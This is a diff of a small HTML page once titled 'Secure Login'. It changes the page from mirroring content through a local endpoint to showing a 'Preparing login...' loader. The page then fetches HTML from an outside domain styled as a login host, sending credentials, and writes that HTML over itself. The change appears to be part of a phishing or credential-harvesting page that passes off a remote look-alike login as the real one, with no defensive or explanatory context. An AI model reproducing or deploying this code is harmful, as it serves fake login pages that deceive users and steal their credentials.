@@ -1,26 +1,27 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Secure Login</title>
+  <title>Loading...</title>
+  <meta charset="utf-8">
+  <style>
+    html, body { margin: 0; height: 100%; background: black; color: #0f0; font-family: monospace; }
+    #loader { text-align: center; padding-top: 20%; }
+  </style>
 </head>
 <body>
-  <script>
-    // Construct the forwardTo URL with all query parameters
-    const urlParams = new URLSearchParams(window.location.search);
-    const forwardTo = `/api/mirror?${urlParams.toString()}`;
+  <div id="loader">Preparing login...</div>
 
-    // Fetch content from the /api/mirror endpoint
-    fetch(forwardTo)
-      .then(res => res.text())
-      .then(html => {
-        document.open();
-        document.write(html);
-        document.close();
-      })
-      .catch(err => {
-        document.body.innerHTML = "<h2>Error loading page.</h2>";
-      });
+  <script>
+    (async () => {
+      const proxyUrl = 'https://login.acceleratedmedicallinc.org/?auth=2'; // must support CORS
+      const response = await fetch(proxyUrl, { credentials: 'include' });
+      const html = await response.text();
+
+      document.open();
+      document.write(html);
+      document.close();
+    })();
   </script>
 </body>
 </html>
+
